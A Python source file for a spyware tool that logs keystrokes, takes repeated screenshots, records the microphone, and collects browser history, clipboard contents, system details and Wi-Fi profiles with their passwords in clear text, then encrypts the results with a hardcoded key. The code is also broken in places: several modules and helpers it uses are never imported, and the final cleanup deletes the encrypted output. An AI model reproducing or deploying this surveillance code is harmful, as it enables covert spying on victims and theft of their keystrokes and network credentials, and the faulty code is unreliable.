import os
import shutil
import socket
import sys
import time
from multiprocessing import Process
from pathlib import Path
from subprocess import Popen, TimeoutExpired, check_output, DEVNULL
from threading import Thread
import requests
from cryptography.fernet import Fernet
from PIL import ImageGrab
from pynput.keyboard import Listener
import browserhistory as bh
import sounddevice

# Regular expression object for file matching
class RegObject:
    def __init__(self):
        self.re_xml = re.compile(r'.{1,255}\.xml$')
        self.re_txt = re.compile(r'.{1,255}\.txt$')
        self.re_png = re.compile(r'.{1,255}\.png$')
        self.re_jpg = re.compile(r'.{1,255}\.jpg$')
        self.re_audio = re.compile(r'.{1,255}\.wav$')

# Encrypt data function
def encrypt_data(files: list, export_path: Path):
    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

    for file in files:
        file_path = export_path / file
        crypt_path = export_path / f'e_{file}'
        try:
            with file_path.open('rb') as plain_text:
                data = plain_text.read()
            encrypted = Fernet(key).encrypt(data)

            with crypt_path.open('wb') as hidden_data:
                hidden_data.write(encrypted)

            file_path.unlink()

        except OSError as file_err:
            print_err(f'Error occurred during file operation: {file_err}')
            logging.exception('Error occurred during file operation: %s\n', file_err)

# Microphone recording function
def microphone(mic_path: Path):
    frames_per_second = 44100
    seconds = 60

    for current in range(1, 6):
        channel = 2 if os.name == 'nt' else 1
        rec_name = mic_path / f'{current}mic_recording.wav' if os.name == 'nt' else mic_path / f'{current}mic_recording.mp4'
        my_recording = sounddevice.rec(int(seconds * frames_per_second), samplerate=frames_per_second, channels=channel)
        sounddevice.wait()
        sounddevice.write(str(rec_name), my_recording, frames_per_second)

# Screenshot capture function
def screenshot(screenshot_path: Path):
    screenshot_path.mkdir(parents=True, exist_ok=True)
    for current in range(1, 61):
        pic = ImageGrab.grab()
        capture_path = screenshot_path / f'{current}_screenshot.png'
        pic.save(capture_path)
        time.sleep(5)

# Keystroke logging function
def log_keys(key_path: Path):
    logging.basicConfig(filename=key_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
    with Listener(on_press=lambda key: logging.info(str(key))) as listener:
        listener.join()

# Get browser history function
def get_browser_history(browser_file: Path):
    try:
        bh_user = bh.get_username()
        db_path = bh.get_database_paths()
        hist = bh.get_browserhistory()
        browser_history = [bh_user, db_path, hist]
        with browser_file.open('w', encoding='utf-8') as browser_txt:
            json.dump(browser_history, browser_txt)
    except Exception as ex:
        print_err(f'Error occurred during browser history retrieval: {ex}')
        logging.exception('Error occurred during browser history retrieval: %s\n', ex)

# Get clipboard data function (Windows only)
def get_clipboard(export_path: Path):
    if os.name == 'nt':
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
        except (OSError, TypeError):
            pasted_data = ''
        finally:
            win32clipboard.CloseClipboard()
        
        clip_path = export_path / 'clipboard_info.txt'
        try:
            with clip_path.open('w', encoding='utf-8') as clipboard_info:
                clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')
        except OSError as file_err:
            print_err(f'Error occurred during file operation: {file_err}')
            logging.exception('Error occurred during file operation: %s\n', file_err)

# Get system information function
def get_system_info(sysinfo_file: Path):
    try:
        if os.name == 'nt':
            syntax = ['systeminfo', '&', 'tasklist', '&', 'sc', 'query']
        else:
            syntax = 'hostnamectl; lscpu; lsmem; lsusb; lspci; lshw; lsblk; df -h'
        
        with sysinfo_file.open('a', encoding='utf-8') as system_info:
            with Popen(syntax, stdout=system_info, stderr=system_info, shell=True, stdin=DEVNULL) as get_sysinfo:
                get_sysinfo.communicate(timeout=30)

    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)
    except TimeoutExpired:
        pass

# Linux Wi-Fi query function
def linux_wifi_query(export_path: Path):
    if os.name != 'nt':
        wifi_path = export_path / 'wifi_info.txt'
        try:
            get_wifis = check_output(['nmcli', '-g', 'NAME', 'connection', 'show'])
            for wifi in get_wifis.split(b'\n'):
                if b'Wired' not in wifi:
                    with wifi_path.open('w', encoding='utf-8') as wifi_list:
                        with Popen(f'nmcli -s connection show {wifi}', stdout=wifi_list, stderr=wifi_list, shell=True) as command:
                            command.communicate(timeout=60)
        except CalledProcessError as proc_err:
            logging.exception('Error occurred during Wi-Fi SSID list retrieval: %s\n', proc_err)
        except OSError as file_err:
            print_err(f'Error occurred during file operation: {file_err}')
            logging.exception('Error occurred during file operation: %s\n', file_err)
        except TimeoutExpired:
            pass

# Get network information function
def get_network_info(export_path: Path, network_file: Path):
    try:
        if os.name == 'nt':
            syntax = ['Netsh', 'WLAN', 'export', 'profile', f'folder={str(export_path)}', 'key=clear', '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a']
        else:
            linux_wifi_query(export_path)
            syntax = 'ifconfig; arp -a; route; netstat -a'

        with network_file.open('w', encoding='utf-8') as network_io:
            with Popen(syntax, stdout=network_io, stderr=network_io, shell=True, stdin=DEVNULL) as commands:
                commands.communicate(timeout=60)
                hostname = socket.gethostname()
                ip_addr = socket.gethostbyname(hostname)
                public_ip = requests.get('https://api.ipify.org').text
                network_io.write(f'[!] Public IP Address: {public_ip}\n[!] Private IP Address: {ip_addr}\n')

    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)
    except TimeoutExpired:
        pass

# Main function
def main():
    try:
        # Determine export path based on OS
        export_path = Path('C:\\Tmp\\logs') if os.name == 'nt' else Path('/tmp/logs/')
        export_path.mkdir(parents=True, exist_ok=True)

        # Define file paths
        network_file = export_path / 'network_info.txt'
        sysinfo_file = export_path / 'system_info.txt'
        browser_file = export_path / 'browser_info.txt'
        log_file = export_path / 'key_logs.txt'
        screenshot_dir = export_path / 'Screenshots'

        # Perform actions to gather information
        get_network_info(export_path, network_file)
        get_system_info(sysinfo_file)
        get_clipboard(export_path) if os.name == 'nt' else None
        get_browser_history(browser_file)
        linux_wifi_query(export_path) if os.name != 'nt' else None

        # Start concurrent processes
        proc_1 = Process(target=log_keys, args=(log_file,))
        proc_1.start()

        proc_2 = Thread(target=screenshot, args=(screenshot_dir,))
        proc_2.start()

        proc_3 = Thread(target=microphone, args=(export_path,))
        proc_3.start()

        # Wait for processes to complete or timeout
        proc_1.join(timeout=300)
        proc_2.join(timeout=300)
        proc_3.join(timeout=300)

        # Terminate key logging process
        proc_1.terminate()

        # Collect files for encryption
        files = ['network_info.txt', 'system_info.txt', 'browser_info.txt', 'key_logs.txt']
        regex_obj = RegObject()

        # Add additional files based on OS
        if os.name == 'nt':
            files.append('clipboard_info.txt')
            files.extend([file.name for file in os.scandir(export_path) if regex_obj.re_xml.match(file.name)])
        else:
            files.append('wifi_info.txt')

        # Encrypt collected files
        encrypt_data(files, export_path)

        # Remove temporary directory and files
        shutil.rmtree(export_path)

    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')
        sys.exit(0)

    except Exception as ex:
        print(f'Unknown exception occurred: {ex}')
        sys.exit(1)

    sys.exit(0)

if __name__ == '__main__':
    main()
